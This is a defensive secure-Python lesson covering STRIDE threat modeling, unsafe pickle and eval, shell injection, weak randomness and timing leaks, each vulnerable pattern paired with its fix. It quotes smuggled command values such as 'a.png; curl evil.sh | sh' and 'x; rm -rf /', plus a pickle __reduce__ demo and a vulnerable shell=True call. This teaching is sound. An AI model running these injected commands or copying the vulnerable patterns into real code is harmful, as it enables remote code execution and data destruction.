# Threat Modeling and Secure Python

**Prerequisites:** [Python fundamentals](../../00-foundations/python-fundamentals/README.md), [cryptography and TLS lab](../../07-networking/tls-security/01-cryptography-and-tls-lab.md) (hashes and HMAC). **You will learn:** how to **think like an attacker on paper** (threat modeling with trust boundaries and STRIDE), and the handful of **Python-specific traps** that cause real breaches: `pickle`, the dynamic-evaluation built-ins, shell injection, weak randomness and timing leaks, each shown breaking and then fixed.

## 1. In plain words

Locks are chosen after you decide what is worth stealing and who might try. **Threat modeling** is that decision, written down before you code: *what are we protecting, who might attack it, where can they get in, and what will we do about it?* Most security bugs are not exotic: they come from trusting input that crossed a boundary without checking it.

## 2. A four-question method

1. **What are we building?** Draw the parts (browser, API, database, third-party service) and the arrows (data flows).
2. **What can go wrong?** Mark each **trust boundary** (where data passes from a less-trusted to a more-trusted zone, such as internet to server) and ask STRIDE questions at each.
3. **What will we do about it?** Mitigate, accept, transfer (insurance) or eliminate (remove the feature).
4. **Did we do a good job?** Test the mitigations; revisit when the design changes.

**STRIDE** is a checklist of six threat types:

| Letter | Threat | Violates | Typical defence |
|--------|--------|----------|-----------------|
| **S**poofing | pretending to be someone else | authentication | strong auth, signed tokens |
| **T**ampering | changing data | integrity | HMAC, signatures, TLS, DB constraints |
| **R**epudiation | "I never did that" | accountability | audit logs |
| **I**nformation disclosure | leaking data | confidentiality | encryption, access control, no secrets in logs |
| **D**enial of service | making it unavailable | availability | rate limits, quotas, timeouts |
| **E**levation of privilege | gaining rights you should not have | authorization | least privilege, check on every request |

## 3. Worked example: a small notes API

Components: browser, API server, database, email service. Arrows: browser to API (crosses the **internet boundary**), API to database, API to email provider (crosses a **third-party boundary**).

```python
from dataclasses import dataclass

@dataclass
class Threat:
    where: str
    stride: str
    what: str
    likelihood: int     # 1 (rare) to 5 (expected)
    impact: int         # 1 (annoying) to 5 (catastrophic)
    mitigation: str

    @property
    def risk(self) -> int:
        return self.likelihood * self.impact

threats = [
    Threat("browser -> API", "Spoofing", "stolen session cookie used by attacker", 3, 4, "short expiry, HttpOnly+Secure cookies, rotate on login"),
    Threat("browser -> API", "Tampering", "user edits note id in URL to read another user's note (IDOR)", 5, 4, "check owner on every read"),
    Threat("API -> database", "Information disclosure", "SQL injection dumps the users table", 3, 5, "parameterized queries, least-privilege DB user"),
    Threat("API", "Denial of service", "one client floods the login endpoint", 4, 3, "rate limit per IP and per account"),
    Threat("API logs", "Information disclosure", "passwords written to logs on error", 3, 3, "redact fields, never log request bodies for /login"),
    Threat("whole system", "Repudiation", "admin deletes a note and denies it", 2, 3, "append-only audit log"),
]
for t in sorted(threats, key=lambda t: t.risk, reverse=True):
    print(f"{t.risk:>2}  {t.where:<16} {t.stride:<22} {t.what}")
# 20  browser -> API   Tampering              user edits note id in URL to read another user's note (IDOR)
# 15  API -> database  Information disclosure SQL injection dumps the users table
# 12  browser -> API   Spoofing               stolen session cookie used by attacker
# 12  API              Denial of service      one client floods the login endpoint
#  9  API logs         Information disclosure passwords written to logs on error
#  6  whole system     Repudiation            admin deletes a note and denies it
```

The point is the **ranking**: you cannot fix everything first, so fix the high-risk rows first. The next lessons implement the top rows ([IDOR and sessions](../authentication/01-authn-authz-sessions-jwt.md), [injection](../web-vulnerabilities/01-owasp-top-ten-in-python.md)).

## 4. Python trap 1: `pickle` runs code

`pickle` can rebuild any object, and an object can say "to rebuild me, call this function". Loading pickled data from anyone you do not fully trust is **remote code execution**. This demo only prints:

```python
import pickle

class Evil:
    def __reduce__(self):
        return (print, ("!!! attacker code ran during pickle.loads",))

payload = pickle.dumps(Evil())
pickle.loads(payload)
# !!! attacker code ran during pickle.loads
```

An attacker would call `os.system(...)` instead of `print`. **Rule:** never unpickle untrusted data (network, uploads, cookies, a cache you share). Use **JSON** (data only, no code) or a schema library. The same warning applies to `yaml.load` without `SafeLoader` and to `marshal`.

```python
import json
data = json.loads('{"user": "ada", "admin": false}')       # only dicts, lists, strings, numbers, booleans, None
print(data)
# {'user': 'ada', 'admin': False}
```

## 5. Python trap 2: dynamic evaluation and shell injection

Python's built-in `eval` and `exec` run **any** Python text you give them, including `__import__('os').system(...)`. Never pass them text that came from a user, a file you do not control or the network. When you only need to read a literal value (a list, number or dict written as text), `ast.literal_eval` parses **only literals** and refuses everything else:

```python
import ast

safe_parse = ast.literal_eval                                # parses literals only, never runs code
print(safe_parse("[1, 2, {'a': 3}]"))
# [1, 2, {'a': 3}]

malicious = "__import__('os').getcwd()"                      # imagine this came from a form
try:
    safe_parse(malicious)
except ValueError as e:
    print("refused:", type(e).__name__)
# refused: ValueError
```

**Shell injection:** building a command string from user input lets the input add commands.

```python
import subprocess

filename = "report.txt; echo INJECTED"           # attacker-controlled
# VULNERABLE: the shell sees two commands separated by ';'
subprocess.run(f"echo converting {filename}", shell=True)
# converting report.txt
# INJECTED

# SAFE: no shell; the whole string is ONE argument, never interpreted
subprocess.run(["echo", "converting", filename])
# converting report.txt; echo INJECTED
```

**Rules:** avoid `shell=True`; pass a **list** of arguments; validate against an allow-list; never evaluate user text as code.

## 6. Python trap 3: randomness and secrets

`random` is a **predictable** generator (Mersenne Twister): anyone who sees enough outputs, or the seed, can predict the rest. Tokens, password-reset links and API keys must come from `secrets` (the operating system's secure source).

```python
import random, secrets

random.seed(1234)
a = [random.randint(0, 9) for _ in range(5)]
random.seed(1234)
b = [random.randint(0, 9) for _ in range(5)]
print(a == b)                                     # same seed, same "random" numbers: predictable
# True

token = secrets.token_urlsafe(32)                 # 32 random bytes, URL-safe text
print(len(token), token == secrets.token_urlsafe(32))
# 43 False
print(secrets.choice("abcdef") in "abcdef")
# True
```

## 7. Python trap 4: timing leaks when comparing secrets

`==` on strings stops at the first different character, so a wrong guess that matches more leading characters takes (very slightly) longer; an attacker measuring that can recover a token one character at a time. `hmac.compare_digest` takes the same time regardless.

```python
import hmac, hashlib

SECRET = b"server-side-key"

def sign(message: bytes) -> str:
    return hmac.new(SECRET, message, hashlib.sha256).hexdigest()

def verify(message: bytes, signature: str) -> bool:
    return hmac.compare_digest(sign(message), signature)      # constant-time comparison

sig = sign(b"user=ada;admin=false")
print(verify(b"user=ada;admin=false", sig))
# True
print(verify(b"user=ada;admin=true", sig))                    # tampered message: signature no longer matches
# False
```

## 8. Habit: validate input with an allow-list

Decide what **is** allowed and reject everything else. Deny-lists ("block `<script>`") always miss something.

```python
import re

USERNAME = re.compile(r"[a-z][a-z0-9_]{2,19}")          # 3 to 20 chars, starts with a letter

def valid_username(s: str) -> bool:
    return USERNAME.fullmatch(s) is not None             # fullmatch: the WHOLE string must fit

print([valid_username(s) for s in ["ada_99", "Ada", "x", "a;drop table", "ok_name"]])
# [True, False, False, False, True]
```

## 9. Common mistakes

- Treating internal networks as trusted ("it is behind the firewall"). Assume breach; check everywhere.
- Writing your own cryptography instead of using vetted libraries and the standard `hashlib`/`hmac`/`secrets`.
- Using `random` for anything security-related.
- Putting secrets in source code, logs, error messages or URLs.
- Validating on the client only. The attacker never uses your client.
- Catching bad input with deny-lists instead of allow-lists.
- Skipping the model: jumping to tools (scanners) before knowing what you protect.

## 10. Two real-world examples

**Example 1: Unpickling a cookie.** A web app stored a session object in a cookie using `pickle` and loaded it back on each request. An attacker crafted a cookie whose `__reduce__` ran a reverse shell. The fix was to store only a random session id in the cookie and keep the data on the server (or a signed JSON token).

**Example 2: Image converter.** A service called `convert {filename} out.png` through a shell. A file named `a.png; curl evil.sh | sh` ran on the server. Passing arguments as a list and generating the filenames server-side removed the whole class of bug.

## 11. Practice

1. Add two threats to the notes-API table (one Elevation of privilege, one Tampering), score them and see where they rank.
2. Write `safe_ping(host)` that validates `host` against an allow-list pattern and calls `subprocess.run(["ping", "-c", "1", host])` without a shell. What happens if `host` is `"x; rm -rf /"`?
3. Generate a 6-digit one-time code securely. Why is `random.randint` wrong here?
4. Sign a cookie value `"user=ada"` with HMAC and write a `load_cookie` that returns the value only if the signature is valid.
5. Why is `ast.literal_eval` safer than the `eval` built-in, and what can it *not* do?

<details>
<summary>Solutions</summary>

1. ```python
   threats += [
       Threat("API", "Elevation of privilege", "normal user calls an /admin endpoint", 3, 5, "role check on every route"),
       Threat("browser -> API", "Tampering", "client sets price in the order request", 4, 4, "ignore client prices; look them up server-side"),
   ]
   print(sorted(t.risk for t in threats))
   # [6, 9, 12, 12, 15, 15, 16, 20]
   ```
2. ```python
   import re, subprocess
   HOST = re.compile(r"[A-Za-z0-9.-]{1,253}")
   def safe_ping(host: str):
       if not HOST.fullmatch(host):
           raise ValueError("invalid host")
       return subprocess.run(["ping", "-c", "1", host])
   # safe_ping("x; rm -rf /") raises ValueError: the ';' and spaces are not in the allow-list
   ```
3. ```python
   import secrets
   code = f"{secrets.randbelow(1_000_000):06d}"
   print(len(code), code.isdigit())
   # 6 True
   ```
   `random.randint` is predictable, so an attacker who observes outputs could predict future codes.
4. ```python
   import hmac, hashlib
   KEY = b"k"
   def dump_cookie(value: str) -> str:
       return value + "." + hmac.new(KEY, value.encode(), hashlib.sha256).hexdigest()
   def load_cookie(cookie: str):
       value, _, sig = cookie.rpartition(".")
       good = hmac.new(KEY, value.encode(), hashlib.sha256).hexdigest()
       return value if hmac.compare_digest(sig, good) else None
   c = dump_cookie("user=ada")
   print(load_cookie(c), load_cookie(c.replace("ada", "root")))
   # user=ada None
   ```
5. `literal_eval` only accepts Python literals (numbers, strings, lists, dicts, tuples, sets, booleans, `None`), so it cannot call functions or import modules. It cannot evaluate names, arithmetic on variables or any call, which is exactly why it is safe.

</details>

## 12. Check yourself

1. What are the four questions of threat modeling?
2. What is a trust boundary, and why do bugs cluster there?
3. Expand STRIDE and name a defence for each letter.
4. Why is unpickling untrusted data equivalent to remote code execution?
5. Why does passing arguments as a list prevent shell injection?
6. When must you use `secrets` instead of `random`?
7. Why is `hmac.compare_digest` preferred to `==` for signatures?

<details>
<summary>Answers</summary>

1. What are we building; what can go wrong; what will we do about it; did we do a good job.
2. A boundary is where data moves from a less-trusted zone to a more-trusted one. Bugs cluster there because input that was never checked is suddenly treated as trustworthy.
3. Spoofing (strong authentication), Tampering (HMAC, signatures, TLS), Repudiation (audit logs), Information disclosure (encryption, access control), Denial of service (rate limits), Elevation of privilege (least privilege, per-request checks).
4. Pickle lets an object name a function to call when it is rebuilt, so the attacker's data chooses code that runs in your process.
5. No shell parses the string, so characters such as `;` and `|` are plain data inside one argument, not command separators.
6. For any value an attacker must not guess: session ids, reset tokens, API keys, one-time codes, salts.
7. `==` returns at the first difference, so response time leaks how much of a guess was right; `compare_digest` takes constant time.

</details>

[Back to Security](../README.md)
